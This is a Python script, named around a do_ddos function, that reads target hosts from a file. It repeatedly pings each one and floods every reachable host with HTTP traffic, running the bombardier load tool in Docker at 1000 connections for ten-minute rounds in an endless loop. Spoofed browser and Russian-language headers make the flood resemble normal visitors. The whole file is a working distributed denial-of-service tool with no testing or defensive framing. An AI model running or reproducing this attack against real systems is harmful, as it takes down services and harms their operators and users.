import os
import subprocess
import sys
from multiprocessing.pool import ThreadPool

INTERVAL_BETWEEN_PING = '10m'
CONNECTIONS_PER_CONTAINER = '1000'
REQUEST_TIMEOUT = '30s'
HEADERS = """
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0;
    Accept-Language: ru-RU;
    Accept-Encoding: gzip, deflate;
    Referer: http://www.google.com/;
"""


def main():
    hosts_file_name = _parse_argv()
    hosts = _hosts_from_file(hosts_file_name)
    while True:
        with ThreadPool(len(hosts)) as tp:
            tp.map(do_ddos, hosts)


def do_ddos(host):
    ping = subprocess.Popen(
            ["ping", "-c", "4", host],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    out = ping.communicate()[0]
    if '100% packet loss' in str(out):
        print(host, 'DOWN')
    else:
        print(host, 'ALIVE')
        command = 'docker run --rm alpine/bombardier --no-print ' \
            f'--connections {CONNECTIONS_PER_CONTAINER} ' \
            f'--duration {INTERVAL_BETWEEN_PING} ' \
            f'--timeout {REQUEST_TIMEOUT} ' \
            f'-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0" ' \
            f'-H "Accept-Language: ru-RU" ' \
            f'-H "Accept-Encoding: gzip, deflate" ' \
            f'-l {host} '
        os.system(command)


def _parse_argv():
    return sys.argv[-1]


def _hosts_from_file(hosts_file_name):
    with open(hosts_file_name, 'r') as file:
        hosts = file.read()
    hosts = hosts.split('\n')
    hosts = [host.strip() for host in hosts if host]
    hosts = list(set(hosts))
    print('Domains: ', len(hosts))
    return hosts


if __name__ == '__main__':
    main()
